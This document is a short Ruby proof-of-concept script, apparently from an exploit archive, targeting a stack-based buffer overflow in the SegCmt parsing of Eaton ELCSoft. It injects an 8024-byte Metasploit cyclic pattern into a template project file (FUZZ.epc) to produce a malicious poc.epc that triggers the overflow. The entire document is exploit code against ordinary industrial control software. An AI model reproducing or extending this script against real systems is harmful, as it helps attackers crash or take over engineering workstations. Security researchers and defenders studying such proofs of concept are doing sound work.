#!/usr/bin/env ruby
# Eaton ELCSoft SegCmt Parsing Stack-based Buffer Overflow Remote Code Execution Vulnerability
require 'rex'
buffer = Rex::Text.pattern_create(8024)

fd = File.open("FUZZ.epc","rb")
sploit = fd.read(fd.stat.size)
fd.close

fd = File.new("poc.epc","wb")
fd.write(sploit.gsub(/MYBUFFER/,buffer))
fd.close
